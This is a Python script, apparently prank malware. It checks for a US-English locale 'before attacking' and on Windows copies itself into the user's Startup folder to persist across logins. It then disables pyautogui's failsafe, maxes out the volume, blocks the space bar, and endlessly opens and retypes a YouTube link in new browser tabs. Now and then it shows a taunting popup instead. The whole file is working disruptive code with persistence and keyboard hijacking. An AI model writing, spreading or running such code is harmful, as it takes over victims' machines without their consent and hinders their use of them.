import time, keyboard, pyautogui, webbrowser, locale, random, os, shutil, sys, platform
from tkinter import *
import tkinter as tk



#Ensure the default language is American English before attacking
while True:
  def get_default_language():
      return locale.getdefaultlocale()[0]
  default_language = get_default_language()
  if default_language != "en_US":
    break
  else:
    #get the host OS
    def get_os():
      sys = platform.system()
      if sys == "Linux":
        return "Linux"
      elif sys == "Windows":
        return "Windows"
      elif sys == "Darwin":
        return "MacOS"
      else:
        return "Unknown"

    ops = get_os()
    if ops == "Windows":
      # Get the path to the current script or executable
      current_script_path = sys.argv[0]
      current_script_name = os.path.basename(current_script_path)

      # Specify the path to the startup folder
      startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

      # Construct the destination path in the startup folder
      destination_path = os.path.join(startup_folder, current_script_name)

      # Copy the script to the startup folder
      shutil.copy(current_script_path, destination_path)
    
    
    time.sleep(5)

    def coin_flip():
      y = random.choice([1,2])
      return y

    while True:
        if coin_flip() == 1:
            win = tk.Tk()
            win.title("Lucky You")
            #Set the geometry of Tkinter frame
            label = tk.Label(win, text="You have been spared... for now", font=('Candara 50')).pack(pady=20)
            win.mainloop()

            time.sleep(5)
            coin_flip()
        else:

            # Turn the volume all the way up
              pyautogui.FAILSAFE = False
              x = 0

              while x < 100:
                  pyautogui.press('volumeup')
                  x+=1

              # Set the main variables
              website = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
              screenWidth, screenHeight = pyautogui.size()

              # Block space bar
              keyboard.block_key('space')

              # Open the web browser
              time.sleep(1)
              webbrowser.open(website)

              # Then the fun begins!
              while True:              
                time.sleep(1)
                keyboard.write(website, delay=0.01)
                keyboard.send("enter")
                time.sleep(3)
                keyboard.press("ctrl")
                keyboard.send("t")
                keyboard.release("ctrl")

              # I Love You ;)